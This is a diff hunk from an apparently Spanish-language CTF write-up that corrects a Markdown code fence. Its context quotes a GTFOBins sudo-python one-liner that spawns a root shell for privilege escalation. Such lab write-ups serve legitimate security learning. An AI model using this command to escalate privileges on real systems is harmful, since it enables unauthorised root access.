@@ -143,7 +143,7 @@ y podemos ejecutar como usuario balilero python 3, miramos el binario en
 https://gtfobins.github.io/gtfobins/python/
 ```
 y nos dice que con sudo, se puede abusar de esta manera:
-````
+```
 sudo python -c 'import os; os.system("/bin/sh")'
 ```
 lo ajustamos:
